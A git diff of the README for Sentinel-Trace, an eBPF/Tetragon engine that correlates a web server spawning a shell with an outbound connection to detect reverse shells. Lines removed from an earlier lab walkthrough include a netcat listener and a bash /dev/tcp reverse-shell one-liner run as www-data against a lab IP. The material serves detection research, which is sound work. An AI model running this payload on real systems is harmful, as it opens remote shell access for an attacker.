@@ -1,74 +1,85 @@
-![Version](https://img.shields.io/badge/version-2.0--correlation-blue?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Success_PoC-success?style=for-the-badge)
+# 🛰️ Sentinel-Trace v2.0: Correlation Engine
 
+> *"Signals are cheap. Decisions are earned."*
 
-# 🛰️ Sentinel Trace v2.0 — Correlation & Context: Exploring Reverse Shell (Work in Progress)
-
-**The Goal:** Moving from isolated signals to **behavioral chains**. 
-Instead of just seeing a process, we link it to network activity and MITRE ATT&CK techniques.
-
-### 🔭 New Capabilities
-- **Network Observability:** Monitoring TCP/UDP connections in real-time via Tetragon.
-- **Signal Correlation:** Linking a `process_exec` (Shell) to a `socket_connect` (Reverse Shell).
-- **Multi-Node Lab:**
-  - 🛡️ **Debian 12** (Target): Protected by Sentinel Trace.
-  - 🛡️ **Metasploitable3** (Vulnerable Target): Expanded monitoring.
-  - 💀 **Kali Linux** (Attacker): Simulation of RCE and Privilege Escalation.
-
-### 🛡️ Planned Scenario: The Reverse Shell Chain
-Sentinel Trace v2.0 will detect the following sequence as a single high-priority alert:
-1. `Nginx` (UID 33) spawns `/bin/sh` (**Process Signal**)
-2. `/bin/sh` initiates an outbound connection to a non-standard port 4444 (**Network Signal**)
-3. **Reasoning:** Unauthorized Outbound Shell (MITRE T1059.004).
-
-### 🛠️ Infrastructure Evolution
-- Integration of **Grafana Loki** or **ELK** to centralize and visualize eBPF signals.
-- First automated enforcement rules (**Sigkill** on confirmed C2 connections).
-
-
-# 🧪 Tetragon Standalone — RCE Correlation Lab (Genesis)
-
-## 🛠️ Step-by-Step Lab Setup
+Sentinel-Trace is the "Thinking Brain" of the eyeC ecosystem. While most security tools alert on isolated events, Sentinel-Trace performs **Stateful Behavioral Correlation**. It ingests low-level kernel telemetry via eBPF to reconstruct attack chains in real-time.
 
 ---
 
-## 1️⃣ Attacker (Kali) Side 
-![Detection Log](assets/img/v2/v2-network-traffic-detection.png)
+## 🧠 Detection Philosophy: The Behavioral Chain
 
-Listener receiving incoming connection from the target
+Sentinel-Trace moves beyond simple pattern matching. It focuses on **Contextual Reasoning**:
 
+1. **The Signal:** An isolated event (e.g., a shell starting).
+2. **The Context:** Who started it? (Nginx) What is its history? (Web user).
+3. **The Correlation:** Did that shell then initiate a network connection?
+4. **The Decision:** High-fidelity alert mapped to MITRE T1059.004.
+
+---
+
+## 🏗️ Technical Architecture
+
+The engine is built in C++ for high-performance JSON parsing and real-time kernel event processing.
+
+* **Ingestion Engine:** Pipes live JSON streams from Tetragon eBPF hooks.
+* **Reasoning Engine:** Evaluates events against `detection_rules.json` using a state-tracking logic.
+* **Alert Manager:** The "Sovereign Bridge" that dispatches containment commands to Sovereign-Shield.
+
+---
+
+## 🧪 V2.0 Case Study: The Reverse Shell Chain
+
+Sentinel-Trace identifies the following sequence as a single high-priority threat:
+
+1. `process_exec`: Parent `nginx` (UID 33) spawns `/bin/bash`.
+2. `socket_connect`: `/bin/bash` connects to external IP on port `4444`.
+3. **Outcome:** Immediate trigger of the Sovereign-Shield isolation protocol.
+
+---
+
+## 🚀 Quick Start
+
+### 1. Prerequisites
+
+* Tetragon (Cilium eBPF Runtime Security)
+* nlohmann/json (C++ JSON library)
+* CMake & G++
+
+### 2. Build & Run
 ```bash
-# Start a Netcat listener on port 4444
-nc -lvnp 4444
+# Build the engine
+mkdir build && cd build
+cmake .. && make
+
+# Launch with the demo script
+sudo ./demo_sentinel.sh
+```
+
+### 3. Adding Rules
+
+Detection logic is decoupled from the code. Add new behaviors in `config/detection_rules.json`:
+```json
+{
+  "rule_id": "ST-001",
+  "name": "Reverse Shell Detection",
+  "mitre_id": "T1059.004",
+  "action": "SOVEREIGN_ISOLATE"
+}
 ```
 
 ---
 
-## 2️⃣ Target (Debian) Side
-![Detection Log](assets/img/v2/v2-tracing-policy-activation.png)
+## 🗺️ Roadmap
 
-Activation of the correlation policy and launch of real-time monitoring with Identity ("organization","Tetragon","cilium ebpf security tool").
-
-```bash
-# 1. Add the network observability policy
-sudo tetra tracingpolicy add policies/v2-correlation/03-network-observability.yaml
-
-# 2. Start the correlation monitor (Filtering for www-data activity)
-sudo tetra getevents --output json | jq -ce '
-  select(.process_kprobe.process.uid == 33 or .process_exec.process.uid == 33)
-'
-```
+* [x] v1.0 Genesis: Single-signal eBPF detection.
+* [x] V2.0 Correlation: C++ engine linking process and network signals.
+* [ ] V2.0 Sovereign Bridge: Fully automated API-based SOAR integration.
+* [ ] v3.1 Predictive Analysis: Basic anomaly detection via frequency analysis.
 
 ---
 
-## 3️⃣ The Attack (Exploit Simulation)
-![Detection Log](assets/img/v2/v2-kali-listener-connection-reverse-shell.png)
+## 👤 Author
 
-Simulation of reverse shell activation as a web user.
-
-```bash
-# Execute the reverse shell payload
-sudo -u www-data bash -c "bash -i >& /dev/tcp/192.168.19.144/4444 0>&1"
-```
-
----
+**O'djuma Badolo**  
+Cybersecurity • Cloud • DevSecOps  
+*The eyeC Project: Making the invisible visible.*
